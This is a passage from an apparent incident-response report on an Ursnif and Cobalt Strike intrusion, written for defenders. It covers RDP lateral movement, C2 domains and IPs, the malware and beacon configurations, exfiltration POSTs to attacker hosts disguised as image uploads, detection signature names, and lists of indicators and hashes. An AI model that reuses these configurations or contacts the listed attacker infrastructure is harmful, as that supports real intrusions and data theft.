connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon.\n\n```image\nAlt: RDP Connections\nDescription: The image displays a log entry indicating a network connection detected related to the execution of the 'firefox.exe' process. It includes technical details such as the technique ID (T1021), process GUID, process ID, user, protocol (TCP), source and destination IP addresses and ports, and the image path of the executed process. This information is likely relevant for cybersecurity analysis, particularly in the context of tracking lateral movement and command execution in a network intrusion scenario.\nTranscription: |\n  Network connection detected:\n  RuleName: technique_id=T1021,technique_name=Remote Services\n  UtcTime:\n  ProcessGuid: {aaadb608-86c9-630c-8d4d-000000000040}\n  ProcessId: 6544\n  Image: C:\\ProgramData\\firefox.exe\n  User:\n  Protocol: tcp\n  Initiated: true\n  SourceIsIpv6: false\n  SourceIp: 10.       60\n  SourceHostname: -\n  SourcePort: 61421\n  DestinationIsIpv6: false\n  DestinationIp: 10.       60\n  DestinationHostname: -\n  DestinationPort: 3389\n  DestinationPortName: -\n```\n\n```image\nAlt: RDP Connections\nDescription: The image displays a table containing data about processes related to the executable 'firefox.exe'. Each row represents an instance of the process execution with the following columns: 'process.pid' (process ID), 'process.executable' (executable path), 'source.ip' (IP address of the source), 'destination.ip' (IP address of the destination), and 'destination.port' (port number). The source IP consistently shows '10.60', while the destination IP varies slightly across different rows, indicating multiple connections or actions taken by the same process.\nTranscription: |\n  | process.pid | process.executable         | source.ip | destination.ip | destination.port |\n  | ----------- | -------------------------- | --------- | -------------- | ---------------- |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n  | 6,544       | C:\\ProgramData\\firefox.exe | 10.0.0.60 | 10.0.0.60      | 3,389            |\n```\n\n## Command and Control\n\n### Ursnif\n\nUrsnif was seen using the following domains and IPs:\n\n```\n5.42.199.83\nsuperliner.top\n62.173.149.7\ninternetlines.in\n31.41.44.97\nsuperstarts.top\n31.41.44.27\nsuperlinez.top\n31.41.44.27\ninternetlined.com\n208.91.197.91\ndenterdrigx.com\n187.190.48.135\n210.92.250.133\n189.143.170.233\n201.103.222.246\n151.251.24.5\n190.147.189.122\n115.88.24.202\n211.40.39.251\n187.195.146.2\n186.182.55.44\n222.232.238.243\n211.119.84.111\n51.211.212.188\n203.91.116.53\n115.88.24.203\n190.117.75.91\n181.197.121.228\n190.167.61.79\n109.102.255.230\n211.119.84.112\n190.107.133.19\n185.95.186.58\n175.120.254.9\n46.194.108.30\n190.225.159.63\n190.140.74.43\n187.156.56.52\n195.158.3.162\n138.36.3.134\n109.98.58.98\n24.232.210.245\n222.236.49.123\n175.126.109.15\n124.109.61.160\n95.107.163.44\n93.152.141.65\n5.204.145.65\n116.121.62.237\n31.166.129.162\n222.236.49.124\n211.171.233.129\n211.171.233.126\n211.53.230.67\n196.200.111.5\n190.219.54.242\n190.167.100.154\n110.14.121.125\n58.235.189.192\n37.34.248.24\n110.14.121.123\n179.53.93.16\n175.119.10.231\n211.59.14.90\n188.48.64.249\n187.232.150.225\n186.7.85.71\n148.255.20.4\n91.139.196.113\n41.41.255.235\n31.167.236.174\n189.165.2.131\n1.248.122.240\n```\n\nWe also observed several modules for Ursnif downloaded from the following IP:\n\n```\n193.106.191.186\n  3db94cf953886aeb630f1ae616a2ec25  cook32.rar\n  d99cc31f3415a1337e57b8289ac5011e  cook64.rar\n  a1f634f177f73f112b5356b8ee04ad19  stilak32.rar\n  8ea6ad3b1acb9e7b2e64d08411af3c9a  stilak64.rar\n  0c5862717f00f28473c39b9cba2953f4  vnc32.rar\n  ce77f575cc4406b76c68475cb3693e14  vnc64.rar\n```\n\nJoeSandbox reported this sample having the following configuration:\n\n```\n{\n  \"RSA Public Key\": \"WzgHg0uTPZvhLtnG19qpIk+GmHzcoxkfTefSu6gst5n3mxnOBivzR4MH4a6Ax7hZ5fgcuPGt3NKKPbYTwmknjD2zYXaAp3+wR0kAZI+LVG1CUiDgK2lhHKV91eobjLR/Z/RtHa+MZM10+zZoBGCk+VjMy7gWkzoCrrhs6/Bft/lYT9NzAGBQ4ZZgJTkXW4tVgEQiGmoc7Ta1/NqrbaQBEciYTW7E4egMKHQeGNrjd94u5PZha7GgX7aseTe7/68QIz2hc7Xl2gtUGQYYVqKgGpKjKrQT5jpYbcjLE+VoRjcWucFAPAfIryWH1A4T+PbO5+eHGGCIM/fAuYU/58JZn0HUmtKm9wHYCUJ/uGotKAI=\",\n  \"c2_domain\": [\n    \"superliner.top\",\n    \"superlinez.top\",\n    \"internetlined.com\",\n    \"internetlines.in\",\n    \"medialists.su\",\n    \"medialists.ru\",\n    \"mediawagi.info\",\n    \"mediawagi.ru\",\n    \"5.42.199.83\",\n    \"denterdrigx.com\",\n    \"и\",\n    \"digserchx.at\"\n  ],\n  \"ip_check_url\": [\n    \"http://ipinfo.io/ip\",\n    \"http://curlmyip.net\"\n  ],\n  \"serpent_key\": \"Jv1GYc8A8hCBIeVD\",\n  \"tor32_dll\": \"file://c:\\\\test\\\\test32.dll\",\n  \"tor64_dll\": \"file://c:\\\\test\\\\tor64.dll\",\n  \"server\": \"50\",\n  \"sleep_time\": \"1\",\n  \"SetWaitableTimer_value(CRC_CONFIGTIMEOUT)\": \"60\",\n  \"time_value\": \"60\",\n  \"SetWaitableTimer_value(CRC_TASKTIMEOUT)\": \"60\",\n  \"SetWaitableTimer_value(CRC_SENDTIMEOUT)\": \"300\",\n  \"SetWaitableTimer_value(CRC_KNOCKERTIMEOUT)\": \"60\",\n  \"not_use(CRC_BCTIMEOUT)\": \"10\",\n  \"botnet\": \"3000\",\n  \"SetWaitableTimer_value\": \"1\"\n}\n```\n\nPivoting on domains registered in WHOIS with the email `snychkova73@bk.ru` or organization `Rus Lak`, reveals many similar domains as seen in this intrusion.\n\n```image\nAlt: WHOIS Domains\nDescription: The image displays WHOIS records for various domains associated with the Ursnif malware, showing details such as the registrar, domain status, and contact email. Key attributes highlighted include the email 'snychkova73@bk.ru' and the organization name 'Rus Lak.' The record appears to detail the registration history of the domain 'superliner.top,' including its creation and expiry dates, indicating its current registration status and contact information.\nTranscription: |\n  Whois Records\n  CHANGE HISTORY\n  Date       Changes\n  2022-10-29\n  2022-08-24  Email\n  \n  Record Updated 2022-08-24 : Last Scanned 2022-11-05\n  Checked by RiskIQ | Expires in 8 months | Created 4 months ago | Hide Diff | Hide Raw Record\n  \n  Attribute                     Value\n  WHOIS Server                  whois.eranet.com\n  Registrar                     Eranet International Limited\n  Domain Status                 clientTransferProhibited serverHold\n  Email                         snychkova73@bk.ru (registrant, admin, tech)\n  Name                          REDACTED FOR PRIVACY\n  Organization                  Rus Lak (registrant, admin, tech)\n  Street                        -\n  City                          -\n  State                         -\n  Postal Code                   -\n  Country                       -\n  Phone                         -\n  \n  NameServers                   a.dnspod.com\n                               b.dnspod.com\n  \n  Domain Name: superliner.top\n  Registry Domain ID: D202208248210001G_86804552-top\n  Registrar WHOIS Server: whois.eranet.com\n  Registrar URL: http://www.eranet.com\n  Updated Date: 2022-08-24T08:27:11Z\n  Creation Date: 2022-08-24T08:27:11Z\n  Registry Expiry Date: 2023-08-24T08:27:11Z\n  Registrar: Eranet International Limited\n  Registrar IANA ID: 1868\n  Registrar Abuse Contact Email: info@todaynic.com\n  Registrar Abuse Contact Phone: +852.7563810566\n  Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n  Domain Status: serverHold https://icann.org/epp#serverHold\n  Registrant ID: REDACTED FOR PRIVACY\n  Registrant Name: REDACTED FOR PRIVACY\n  Registrant Organization: Rus Lak\n  Registrant Street: REDACTED FOR PRIVACY\n  Registrant City: REDACTED FOR PRIVACY\n  Registrant State/Province: Voronezh\n  Registrant Postal Code: REDACTED FOR PRIVACY\n  Registrant Country: RU\n  Registrant Phone: REDACTED FOR PRIVACY\n  Registrant Phone Ext: REDACTED FOR PRIVACY\n  Registrant Fax: +7.89278708414\n  Registrant Fax Ext:\n  Registrant Email: snychkova73@bk.ru\n```\n\n```image\nAlt: WHOIS Domains\nDescription: The image is a screenshot of a WHOIS domain registration database, displaying a list of domains registered with the email 'snychkova73@bk.ru'. It includes columns for 'Focus', 'Email', 'Registered', 'Expires', and 'Tags'. The domains listed are related to various online services, and their registration dates range from October to December 2022.\nTranscription: |\n  | Focus               | Email             | Registered | Expires    | Tags |\n  | ------------------- | ----------------- | ---------- | ---------- | ---- |\n  | agenziaonline.top   | snychkova73@bk.ru | 2022-12-01 | 2023-12-01 |      |\n  | onlineagenzia.top   | snychkova73@bk.ru | 2022-12-01 | 2023-12-01 |      |\n  | onlynetwork.top     | snychkova73@bk.ru | 2022-11-28 | 2023-11-28 |      |\n  | optinetwork.top     | snychkova73@bk.ru | 2022-11-28 | 2023-11-28 |      |\n  | internetnetwork.top | snychkova73@bk.ru | 2022-11-26 | 2023-09-22 |      |\n  | interspin.top       | snychkova73@bk.ru | 2022-11-26 | 2023-09-22 |      |\n  | superliner.top      | snychkova73@bk.ru | 2022-10-29 | 2023-08-24 |      |\n  | superlinz.top       | snychkova73@bk.ru | 2022-10-29 | 2023-08-24 |      |\n```\n\n### Cobalt Strike\n\nThe following Cobalt Strike C2 server was observed:\n\n```\n193.201.9.199:443\nJA3: 72a589da586844d7f0818ce684948eea\nJA3s: f176ba63b4d68e576b5ba345bec2c7b7\nCertificate: [6e:ce:5e:ce:41:92:68:3d:2d:84:e2:5b:0b:a7:e0:4f:9c:b7:eb:7c]\nNot Before: 2015/05/20 18:26:24 UTC\nNot After: 2025/05/17 18:26:24 UTC\nIssuer Org:\nSubject Common:\nSubject Org:\nPublic Algorithm: rsaEncryption\n```\n\nThe following Cobalt Strike configuration was observed:\n\n```\n{\n  \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n  \"pipename\": null,\n  \"dns_beacon\": {\n    \"put_metadata\": null,\n    \"get_TXT\": null,\n    \"get_AAAA\": null,\n    \"get_A\": null,\n    \"beacon\": null,\n    \"maxdns\": null,\n    \"dns_sleep\": null,\n    \"put_output\": null,\n    \"dns_idle\": null\n  },\n  \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"post_ex\": {\n    \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n    \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\"\n  },\n  \"stage\": {\n    \"cleanup\": \"false\"\n  },\n  \"process_inject\": {\n    \"stub\": \"IiuPJ9vfuo3dVZ7son6mSA==\",\n    \"transform_x64\": [],\n    \"transform_x86\": [],\n    \"startrwx\": \"true\",\n    \"min_alloc\": \"0\",\n    \"userwx\": \"true\",\n    \"execute\": [\n      \"CreateThread\",\n      \"SetThreadContext\",\n      \"CreateRemoteThread\",\n      \"RtlCreateUserThread\"\n    ],\n    \"allocator\": \"VirtualAllocEx\"\n  },\n  \"uses_cookies\": \"true\",\n  \"http_post_chunk\": \"0\",\n  \"ssh\": {\n    \"privatekey\": null,\n    \"username\": null,\n    \"password\": null,\n    \"port\": null,\n    \"hostname\": null\n  },\n  \"useragent_header\": null,\n  \"maxgetsize\": \"1048576\",\n  \"proxy\": {\n    \"behavior\": \"Use IE settings\",\n    \"password\": null,\n    \"username\": null,\n    \"type\": null\n  },\n  \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"server\": {\n    \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\",\n    \"port\": \"443\",\n    \"hostname\": \"193.201.9.199\"\n  },\n  \"beacontype\": [\n    \"HTTPS\"\n  ],\n  \"kill_date\": null,\n  \"license_id\": \"1580103824\",\n  \"jitter\": \"0\",\n  \"sleeptime\": \"60000\",\n  \"http_get\": {\n    \"server\": {\n      \"output\": [\n        \"print\"\n      ]\n    },\n    \"client\": {\n      \"metadata\": [],\n      \"headers\": []\n    },\n    \"verb\": \"GET\",\n    \"uri\": \"/__utm.gif\"\n  },\n  \"cfg_caution\": \"false\",\n  \"host_header\": \"\",\n  \"crypto_scheme\": \"0\",\n  \"http_post\": {\n    \"client\": {\n      \"output\": [],\n      \"id\": [],\n      \"headers\": []\n    },\n    \"verb\": \"POST\",\n    \"uri\": \"/submit.php\"\n  }\n}\n```\n\nChecking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike, `83cd09b0f73c909bfc14883163a649e1d207df22`.\n\n```image\nAlt: Cobalt Strike Certificate\nDescription: The image displays detailed information about a Cobalt Strike SSL certificate. It includes attributes such as the serial number, issue and expiration dates, common name, alternative names, organization name, SSL version, organization unit, street address, locality, state/province, and country. The certificate was issued on March 20, 2020, and expires on June 18, 2020. Additionally, it lists various IP addresses associated with the certificate and other related metadata.\nTranscription: |\n  ▼ 83cd09b0f73c909bfc14883163a649e1d207df22\n  Serial Number    1514727070\n  Issued           2020-03-20\n  Expires          2020-06-18\n  Common Name      Major Cobalt Strike (subject)\n                   Major Cobalt Strike (issuer)\n  Alternative Names\n  Organization Name cobaltstrike (subject)\n                   cobaltstrike (issuer)\n  SSL Version      3\n  Organization Unit AdvancedPenTesting (subject)\n                   AdvancedPenTesting (issuer)\n  Street Address\n  Locality         Somewhere (subject)\n                   Somewhere (issuer)\n  State/Province   Cyberspace (subject)\n                   Cyberspace (issuer)\n  Country          Earth (subject)\n                   Earth (issuer)\n  120.55.52.230\n  107.172.21.150\n  2.47.145.134\n  147.182.141.254\n  1.117.23.177\n  123.60.220.134\n  82.157.61.211\n  1.13.165.153\n  178.18.255.124\n  81.68.212.18\n  ...90 more (757 total)\n```\n\n### Atera & SplashTop\n\nEven though the threat actor installed these agents, we did not observe any activity with these tools.\n\n## Exfiltration\n\nSeveral HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.\n\n```image\nAlt: HTTP Post Events\nDescription: This image displays a table of HTTP POST events, showing various attributes such as method, host, URI, referrer, version, and user agent. The user agent indicates an unusual configuration, mimicking Internet Explorer 8.0. The table contains multiple entries with details related to potential exfiltration activities associated with the Ursnif malware.\nTranscription: |\n  | method | host            | uri                                                                    | referrer | version | user_agent                                                      |\n  | ------ | --------------- | ---------------------------------------------------------------------- | -------- | ------- | --------------------------------------------------------------- |\n  | POST   | 5.42.199.83     | /images/Ck9eK1t7nG2aJEFfRkH3G/6Edg_2F0Wz/zejo8Et_2FWtBqwPAL/p_2FjJWus  |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | denterdrigx.com | /images/N9DgCzRluSy_2/FCm0_2B0/8kLCopNibkm_2B3DLQ3Pgn/7sc7cmax4/n_2I   |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/y_2FwnJBSxM7p/XliYjcT0stjS0j8g_2FS/eETNAGNiA30V_2F/rYJHD0NjM8  |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/QTPIU076Cf/kxh_2FqyrnKmaNobB/Wd1c0t8W1h2/7NMzHdJFTV/xq80XWt    |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/nTdMVrZTaLEsT7/6v_2Fps52Z1cysPt46PQ4/pQvLbE56AXTofdFr/1awUjWUs |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | denterdrigx.com | /images/5_2BHRW7kYh3_2F/0JFWeryjais/5W8gA/pYSkVgFJdO/p_2B              |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/YiuBf7xIzXt/7J0x_2Bg5AnA/0deMFo1gKYC0/0L0e1q1NpVTXDbU1h1       |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/etrSoTrBiPG4WT0kU8S/2Fv5CulAj6iUp/CYmKaAfo17jHq9k/6_2By70v     |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/NKN0u0L_2B1b9eNlg/dzchW504/NZ6KvpxclcuZ7Ti9u1/K52qVk458BTN     |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n  | POST   | superliner.top  | /images/NWNK0u0L_2B1b9eNlg/dzchW504/NZ6KvpxclcuZ7Ti9u1/K52qVk458BTN    |          | 1.1     | Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64) |\n```\n\nThe user agent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)’, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).\n\nThe POST event included a MIME part indicating file upload activity\n\n```image\nAlt: MIME Part\nDescription: The image displays a MIME multipart media encapsulation format, which is utilized for sending files over HTTP. It includes details such as the type of content ('multipart/form-data'), the boundary used for separating parts of the data, and specifics about the encapsulated multipart part, which indicates a file upload. The content disposition shows the name and filename of the uploaded file ('775E.bin') along with data size (544 bytes). This technical information is relevant for understanding the file exfiltration process described in the context.\nTranscription: |\n  MIME Multipart Media Encapsulation, Type: multipart/form-data, Boundary: \"120883289042639862971\"\n  [Type: multipart/form-data]\n  First boundary: --120883289042639862971\\r\\n\n  Encapsulated multipart part:\n  Content-Disposition: form-data; name=\"upload_file\"; filename=\"775E.bin\"\\r\\n\\r\\n\n  Data (544 bytes)\n```\n\nThe example HTTP stream containing the content\n\n```image\nAlt: HTTP Stream\nDescription: The image displays a raw HTTP POST request, showing details related to a file upload activity. It includes headers such as 'Content-Type', 'User-Agent', 'Content-Length', and the actual content being sent in the request. The content disposition indicates the file being uploaded is named '775E.bin'. This technical information is relevant for analyzing exfiltration activities in cybersecurity.\nTranscription: |\n  POST /images/YiuB7f1xzJXt/170x_2Bg5An/a0dePMOf1gKYCO/\n  00Leq1NPvlYTKD8uInh1/4K3i8n_2BAroasG2/2nmvPNlVByFE7KL/xylY1RoxhI8UPrMw1w/K7VyU8izC/\n  70WPgttanotV9GsmJx/CjIaaKCS8S1Xd571/_2FcTxPv6UmYw0sQ3Ge6xc/XRHa6n_2Bh9pQ/5qrw8sQ_/\n  2BjJNG1C8D0suFRWqZJAoTa/TgZgZn9tS_/2Fy5m4aJejM_2BkN/4zw0medubdVk/FKjbQC4413d/VJeNInhAplok747/uai20.bmp\n  HTTP/1.1\n  Content-Type: multipart/form-data; boundary=120883289042639862971\n  User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)\n  Host: superliner.top\n  Content-Length: 673\n  Connection: Keep-Alive\n  Cache-Control: no-cache\n  \n  --120883289042639862971\n  Content-Disposition: form-data; name=\"upload_file\"; filename=\"775E.bin\"\n  \n  ...Y...@...J51j...b...q...t...7.Q.z.K.x...X...u...*...YR:0.9b.Kr...#...vG...z...l...\n  ...y...B...l...\n  ...y...D...D...P...P...F.3...y...k.h.+.fH...<...a\\v.X.p>.../n.J./F......(....1...\n  ...*...N...l...J...3...6j9...\n  ...d...g...d...o...Z.e.fpd^......F...6...<...\n  ...&...c...U...n...e...v...(...\n  ...U.N\n  --120883289042639862971--\n```\n\nThe file that was uploaded 775E.bin was deleted by the injected ‘Explorer.exe’ process from the target endpoint in folder ‘\\Users\\<REDACTED>\\AppData\\Local\\Temp’\n\n```image\nAlt: File Deletion\nDescription: The image displays a snippet of text showing a file deletion log. It indicates that the process 'Explorer.EXE' located in 'C:\\Windows' was involved in deleting a file named '775E.bin' from a user's temporary files directory ('C:\\Users\\<REDACTED>\\AppData\\Local\\Temp'). The target file path is partially redacted, suggesting that it may contain sensitive information.\nTranscription: |\n  Image: C:\\Windows\\Explorer.EXE\n  TargetFilename: C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\775E.bin\n```\n\nThe exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon. In this example, the mix of activity can be observed as:\n\n```image\nAlt: Network Signatures\nDescription: The image displays a list of network signatures related to the Ursnif malware variants, specifically focusing on Command and Control (CnC) data exfiltration and beaconing activities. The list includes repeated entries for 'ET MALWARE Ursnif Variant CnC Data Exfil' and 'ET MALWARE Ursnif Variant CnC Beacon', indicating the signatures used to detect these specific types of network activity associated with the malware.\nTranscription: |\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Data Exfil\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Beacon\n  ET MALWARE Ursnif Variant CnC Data Exfil\n  ET MALWARE Ursnif Variant CnC Data Exfil\n  ET MALWARE Ursnif Variant CnC Beacon\n```\n\n## Impact\n\nThe threat actor was able to RDP to a backup server using the admin credentials they acquired. Using the logs in `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` we were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session. By doing this, they revealed the workstation name of the client: `WIN-RRRU9REOK18`.\n\n```\nLogName=Security\nEventCode=4624\nEventType=0\nComputerName=<REDACTED>\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=300297\nKeywords=Audit Success\nTaskCategory=Logon\nOpCode=Info\nMessage=An account was successfully logged on.\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\nNetwork Information:\n\tWorkstation Name:\tWIN-RRRU9REOK18\n\tSource Network Address:\t<REDACTED>\n\tSource Port:\t\t0\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM\n\tTransited Services:\t-\n\tPackage Name (NTLM only):\tNTLM V2\n```\n\nDuring that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.\n\nProcess execution:\n\n```\nC:\\Program Files\\[redacted]\\Console\\[redacted].exe\n\"C:\\Windows\\system32\\taskmgr.exe\" /4\n\"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\USER\\Desktop\\New Text Document.txt\n```\n\nSysmon Copy Paste Collection EID 24:\n\n```\nuser: DOMAIN\\USER ip: 127.0.0.1 hostname: WIN-RRRU9REOK18\n```\n\n```image\nAlt: Sysmon Copy Paste\nDescription: The image displays a Sysmon event log detailing an event related to process execution. It contains structured data including the event's timestamp, user information, process details, and host information. Relevant fields include 'ClientInfo' showing the user and IP address, hashed values for integrity checks, and the image path of the executed process (PowerShell). The log appears to be in JSON format, indicating the event's characteristics, such as process ID and associated session.\nTranscription: |\n  json\n  {\n    \"EventData\": {\n      \"Archived\": \"true\",\n      \"ClientInfo\": {\n        \"user\": \"ip: 127.0.0.1\",\n        \"hostname\": \"WIN-RRRU9REOK18\"\n      },\n      \"Hashes\": {\n        \"SHA1\": \"DA39A3EE5E6B48B0D3255BFE95601890AFB70709\",\n        \"MD5\": \"D41D8CD98F00B204E9800998ECF8427E\",\n        \"SHA256\": \"E3B0C44298FC1C149AFBF4C8996FB9247AE41E4649B934CA495991B7852B855\",\n        \"IMPHASH\": \"00000000000000000000000000000000\"\n      },\n      \"Image\": \"C:\\\\Windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n      \"ProcessGuid\": \"BB66CC4A-7A32-630E-BB6F-000000000300\",\n      \"ProcessId\": 11780,\n      \"RuleName\": \"\",\n      \"Session\": 4,\n      \"User\": \"\",\n      \"UtcTime\": \"00:12:06.271\"\n    }\n  }\n```\n\n# Indicators\n\n### Atomic\n\n```\nRDP Client Name:\nWIN-RRRU9REOK18\n\nUrsnif Domains:\ndenterdrigx.com\nsuperliner.top\ninternetlines.in\nsuperstarts.top\nsuperlinez.top\ninternetlined.com\n\nUrsnif IPs:\n62.173.149.7\n31.41.44.97\n5.42.199.83\n31.41.44.27\t\n208.91.197.91\n187.190.48.135\n210.92.250.133\n189.143.170.233\n201.103.222.246\n151.251.24.5\n190.147.189.122\n115.88.24.202\n211.40.39.251\n187.195.146.2\n186.182.55.44\n222.232.238.243\n211.119.84.111\n51.211.212.188\n203.91.116.53\n115.88.24.203\n190.117.75.91\n181.197.121.228\n190.167.61.79\n109.102.255.230\n211.119.84.112\n190.107.133.19\n185.95.186.58\n175.120.254.9\n46.194.108.30\n190.225.159.63\n190.140.74.43\n187.156.56.52\n195.158.3.162\n138.36.3.134\n109.98.58.98\n24.232.210.245\n222.236.49.123\n175.126.109.15\n124.109.61.160\n95.107.163.44\n93.152.141.65\n5.204.145.65\n116.121.62.237\n31.166.129.162\n222.236.49.124\n211.171.233.129\n211.171.233.126\n211.53.230.67\n196.200.111.5\n190.219.54.242\n190.167.100.154\n110.14.121.125\n58.235.189.192\n37.34.248.24\n110.14.121.123\n179.53.93.16\n175.119.10.231\n211.59.14.90\n188.48.64.249\n187.232.150.225\n186.7.85.71\n148.255.20.4\n91.139.196.113\n41.41.255.235\n31.167.236.174\n189.165.2.131\n1.248.122.240\n193.106.191.186\n\nCobalt Strike:\n193.201.9.199\n```\n\n### Computed\n\n```\n3488164.iso\nf7d85c971e9604cc6d2a2ffcac1ee4a3\n67175143196c17f10776bdf5fbf832e50a646824\ne999890ce5eb5b456563650145308ae837d940e38aec50d2f02670671d472b99\n\n6570872.lnk\nc6b605a120e0d3f3cbd146bdbc358834\n328afa8338d60202d55191912eea6151f80956d3\n16323b3e56a0cbbba742b8d0af8519f53a78c13f9b3473352fcce2d28660cb37\n\nadcomp.bat\neb2335e887875619b24b9c48396d4d48\nb658ab9ac2453cde5ca82be667040ac94bfcbe2e\n4aa4ee8efcf68441808d0055c26a24e5b8f32de89c6a7a0d9b742cce588213ed\n\nalsoOne.bat\nc03f5e2bc4f2307f6ee68675d2026c82\n4ce65da98f0fd0fc4372b97b3e6f8fbeec32deb3\n6a9b7c289d7338760dd38d42a9e61d155ae906c14e80a1fed2ec62a4327a4f71\n\ncanWell.js\n6bb867e53c46aa55a3ae92e425c6df91\n6d4f1a9658baccd2e406454b2ad40ca2353916ab\n5b51bd2518ad4b9353898ed329f1b2b60f72142f90cd7e37ee42579ee1b645be\n\nfirefox.exe\n6a4356bd2b70f7bd4a3a1f0e0bfec9a4\n485a179756ff9586587f8728e173e7df83b1ffc3\n6c5338d84c208b37a4ec5e13baf6e1906bd9669e18006530bf541e1d466ba819\n\nitsIt.db\n60375d64a9a496e220b6eb1b63e899b3\nd1b2dd93026b83672118940df78a41e2ee02be80\n8e570e32acb99abfd0daf62cff13a09eb694ebfa633a365d224aefc6449f97de\n\nor.jpg\n60ca7723edd4f3a0561ea9d3a42f82b4\n87b699122dacf3235303a48c74fa2b7a75397c6b\nbbcceb987c01024d596c28712e429571f5758f67ba12ccfcae197aadb8ab8051\n\ncook32.rar\n3db94cf953886aeb630f1ae616a2ec25\n743128253f1df9e0b8ee296cfec17e5fc614f98d\n1cdbf7c8a45b753bb5c2ea1c9fb2e53377d07a3c84eb29a1b15cdc140837f654\n\ncook64.rar\nd99cc31f3415a1337e57b8289ac5011e\nf67ce90f66f6721c3eea30581334457d6da23aac\nb94810947c33a0a0dcd79743a8db049b8e45e73ca25c9bfbf4bfed364715791b\n\nstilak32.rar\na1f634f177f73f112b5356b8ee04ad19\n7c82b558a691834caf978621f288af0449400e03\nc77ea4ad228ecad750fb7d4404adc06d7a28dbb6a5e